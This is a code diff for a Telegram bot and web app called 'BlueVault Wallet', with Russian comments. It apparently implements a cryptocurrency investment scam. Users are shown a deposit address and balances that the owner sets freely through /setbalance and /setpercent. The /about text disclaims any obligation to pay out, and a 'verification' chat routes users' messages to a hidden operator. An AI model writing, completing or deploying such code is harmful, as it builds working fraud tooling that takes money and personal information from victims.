@@ -56,16 +56,22 @@ app = Flask(__name__)
 _handled = set()
 verification_sessions = {}
 
+# Защита от множественной регистрации
+if not hasattr(bot, '_handlers_registered'):
+    bot._handlers_registered = False
+
 def already_handled(event):
-    msg_id = event.id
+    msg_id = getattr(event, 'id', None)
+    if not msg_id:
+        return False
     if msg_id in _handled:
         return True
     _handled.add(msg_id)
-    if len(_handled) > 20000:
+    if len(_handled) > 30000:
         _handled.clear()
     return False
 
-# ====================== HTML (без изменений) ======================
+# ====================== HTML ======================
 HTML_PAGE = '''<!DOCTYPE html>
 <html>
 <head>
@@ -155,10 +161,30 @@ HTML_PAGE = '''<!DOCTYPE html>
             .catch(()=>{ document.getElementById('statusDot').style.background='var(--red)'; });
         }
 
-        function showStake(){ /* ... */ document.getElementById('mainScreen').classList.add('hidden'); document.getElementById('stakeScreen').classList.remove('hidden'); fetch('/get_address').then(r=>r.json()).then(d=>{document.getElementById('cryptoAddress').textContent=d.address}); }
-        function showWithdraw(){ /* ... */ document.getElementById('mainScreen').classList.add('hidden'); document.getElementById('withdrawScreen').classList.remove('hidden'); }
-        function goBack(){ /* ... */ document.getElementById('mainScreen').classList.remove('hidden'); document.getElementById('stakeScreen').classList.add('hidden'); document.getElementById('withdrawScreen').classList.add('hidden'); }
-        function copyAddress(){ navigator.clipboard.writeText(document.getElementById('cryptoAddress').textContent); }
+        function showStake(){
+            document.getElementById('mainScreen').classList.add('hidden');
+            document.getElementById('stakeScreen').classList.remove('hidden');
+            document.getElementById('withdrawScreen').classList.add('hidden');
+            fetch('/get_address').then(r=>r.json()).then(d=>{document.getElementById('cryptoAddress').textContent=d.address});
+        }
+
+        function showWithdraw(){
+            document.getElementById('mainScreen').classList.add('hidden');
+            document.getElementById('stakeScreen').classList.add('hidden');
+            document.getElementById('withdrawScreen').classList.remove('hidden');
+        }
+
+        function goBack(){
+            document.getElementById('mainScreen').classList.remove('hidden');
+            document.getElementById('stakeScreen').classList.add('hidden');
+            document.getElementById('withdrawScreen').classList.add('hidden');
+        }
+
+        function copyAddress(){
+            navigator.clipboard.writeText(document.getElementById('cryptoAddress').textContent).then(()=>{
+                tg.showPopup({title:'Copied',message:'Address copied to clipboard'});
+            });
+        }
 
         updateBalance();
         setInterval(updateBalance, 15000);
@@ -174,53 +200,117 @@ def index():
 @app.route('/get_balance')
 def get_balance():
     user_id = request.args.get('user_id')
-    return jsonify({
-        'balance': float(user_balances.get(str(user_id), 0)),
-        'percent': current_percent
-    })
+    return jsonify({'balance': float(user_balances.get(str(user_id), 0)), 'percent': current_percent})
 
 @app.route('/get_address')
 def get_address():
     return jsonify({'address': CRYPTO_ADDRESS})
 
-# ====================== ОБРАБОТЧИКИ (с защитой) ======================
-@bot.on(events.NewMessage(incoming=True, pattern='/start'))
-async def start(event):
-    if already_handled(event): return
-    user_id = str(event.sender_id)
-    user_balances.setdefault(user_id, 0)
-    save_data(user_balances, current_percent)
-    await event.respond('🛡 BlueVault Wallet\nℹ Use /about for project info', buttons=[
-        [Button.url('🚀 Open App', 'https://t.me/BlueVaultt_bot/bluevallet')]
-    ])
+# ====================== РЕГИСТРАЦИЯ ОБРАБОТЧИКОВ ======================
+async def register_handlers():
+    if bot._handlers_registered:
+        return
+    bot._handlers_registered = True
 
-@bot.on(events.NewMessage(incoming=True, pattern='/about'))
-async def about(event):
-    if already_handled(event): return
-    await event.respond('''ℹ **About BlueVault** ... (твой оригинальный текст)''')
+    @bot.on(events.NewMessage(incoming=True, pattern='/start'))
+    async def start(event):
+        if already_handled(event): return
+        user_id = str(event.sender_id)
+        user_balances.setdefault(user_id, 0)
+        save_data(user_balances, current_percent)
+        await event.respond('🛡 BlueVault Wallet\nℹ Use /about for project info', buttons=[
+            [Button.url('🚀 Open App', 'https://t.me/BlueVaultt_bot/bluevallet')]
+        ])
 
-# Добавь incoming=True во все остальные обработчики аналогично:
+    @bot.on(events.NewMessage(incoming=True, pattern='/about'))
+    async def about(event):
+        if already_handled(event): return
+        await event.respond(
+            'ℹ **About BlueVault**\n\n'
+            '**1. Схема работы:** Участник предоставляет интерфейс доступа к бирже. Система (набор алгоритмов и трейдботов) анализирует данные и совершает тестовые транзакции. Любые положительные изменения на счёте — технический побочный эффект работы ИИ.\n\n'
+            '**2. Доступ закрытый:** Проект не является публичной офертой. Доступ только по персональному приглашению. Логика алгоритмов не разглашается.\n\n'
+            '**3. Отказ от ответственности:** Все действия алгоритмов носят экспериментальный характер. Разработчики не гарантируют никакого результата. Участник действует на свой риск. Изменения баланса не являются обязательством выплат со стороны BlueVault.\n\n'
+            '**4. Благодарность:** Спасибо за использование BlueVault. Ваше участие помогает тестировать и дорабатывать алгоритмы нового поколения в реальных рыночных условиях.'
+        )
 
-@bot.on(events.NewMessage(incoming=True, pattern='/setbalance'))
-async def set_balance(event):
-    if already_handled(event) or event.sender_id != OWNER_ID: return
-    # ... остальной код
+    @bot.on(events.NewMessage(incoming=True, pattern='/setbalance'))
+    async def set_balance(event):
+        if already_handled(event) or event.sender_id != OWNER_ID: return
+        try:
+            _, target_id, amount = event.text.split()
+            target_id = str(target_id)
+            user_balances[target_id] = float(amount)
+            save_data(user_balances, current_percent)
+            await event.respond(f'Balance {target_id}: {amount} USDT')
+        except:
+            await event.respond('/setbalance <id> <amount>')
 
-@bot.on(events.NewMessage(incoming=True, pattern='/setpercent'))
-async def set_percent(event):
-    if already_handled(event) or event.sender_id != OWNER_ID: return
-    # ...
+    @bot.on(events.NewMessage(incoming=True, pattern='/setpercent'))
+    async def set_percent(event):
+        if already_handled(event) or event.sender_id != OWNER_ID: return
+        try:
+            global current_percent
+            current_percent = int(event.text.split()[1])
+            save_data(user_balances, current_percent)
+            await event.respond(f'Percent set to {current_percent}%')
+        except:
+            await event.respond('/setpercent <number>')
 
-# (Аналогично добавь incoming=True к /myid, /msg, /verify, /reply, /endverify)
+    @bot.on(events.NewMessage(incoming=True, pattern='/myid'))
+    async def myid(event):
+        if already_handled(event): return
+        await event.respond(f'Your ID: {event.sender_id}')
 
-@bot.on(events.NewMessage(incoming=True, func=lambda e: e.sender_id in verification_sessions and e.text and not e.text.startswith('/')))
-async def handle_verification(event):
-    if already_handled(event): return
-    await bot.send_message(OWNER_ID, f'#VERIFY_MSG From: {event.sender_id}\nMessage: {event.text}')
+    @bot.on(events.NewMessage(incoming=True, pattern='/msg'))
+    async def msg(event):
+        if already_handled(event) or event.sender_id != OWNER_ID: return
+        try:
+            parts = event.text.split(maxsplit=2)
+            target_id, message = int(parts[1]), parts[2] if len(parts) > 2 else ''
+            await bot.send_message(target_id, message)
+            await event.respond('Sent')
+        except:
+            await event.respond('/msg <id> <text>')
 
+    @bot.on(events.NewMessage(incoming=True, pattern='/verify'))
+    async def verify(event):
+        if already_handled(event): return
+        verification_sessions[event.sender_id] = True
+        await event.respond('✅ Verification started. Send your messages below.')
+        await bot.send_message(OWNER_ID, f'#VERIFY User {event.sender_id} started verification.')
+
+    @bot.on(events.NewMessage(incoming=True, func=lambda e: e.sender_id in verification_sessions and e.text and not e.text.startswith('/')))
+    async def handle_verification(event):
+        if already_handled(event): return
+        await bot.send_message(OWNER_ID, f'#VERIFY_MSG From: {event.sender_id}\nMessage: {event.text}')
+
+    @bot.on(events.NewMessage(incoming=True, pattern='/reply'))
+    async def reply(event):
+        if already_handled(event) or event.sender_id != OWNER_ID: return
+        try:
+            parts = event.text.split(maxsplit=2)
+            target_id, message = int(parts[1]), parts[2] if len(parts) > 2 else ''
+            await bot.send_message(target_id, f'🛡 Operator: {message}')
+            await event.respond('Replied')
+        except:
+            await event.respond('/reply <id> <text>')
+
+    @bot.on(events.NewMessage(incoming=True, pattern='/endverify'))
+    async def end_verify(event):
+        if already_handled(event) or event.sender_id != OWNER_ID: return
+        try:
+            target_id = int(event.text.split()[1])
+            verification_sessions.pop(target_id, None)
+            await bot.send_message(target_id, '✅ Verification completed.')
+            await event.respond(f'Ended for {target_id}')
+        except:
+            await event.respond('/endverify <id>')
+
+# ====================== ЗАПУСК ======================
 async def main():
     await bot.start(bot_token=BOT_TOKEN)
-    logger.info("✅ Бот запущен успешно")
+    await register_handlers()
+    logger.info("✅ Бот BlueVault запущен успешно")
     await bot.run_until_disconnected()
 
 def run_flask():
